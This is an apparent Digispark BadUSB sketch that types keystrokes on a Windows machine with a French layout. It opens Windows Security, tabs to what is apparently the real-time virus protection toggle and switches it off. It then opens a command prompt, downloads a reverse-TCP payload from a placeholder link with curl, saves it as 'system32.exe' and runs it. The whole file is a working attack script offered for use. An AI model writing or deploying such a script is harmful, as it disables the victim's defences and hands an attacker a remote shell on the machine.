#include <DigiKeyboardFr.h>

void setup() {
  DigiKeyboard.sendKeyStroke(KEY_S, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboardFr.print("virus et menaces");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboardFr.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboardFr.print("curl lien_du_reverse_tcp -o system32.exe");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);
  DigiKeyboardFr.print("system32.exe");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboardFr.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {}
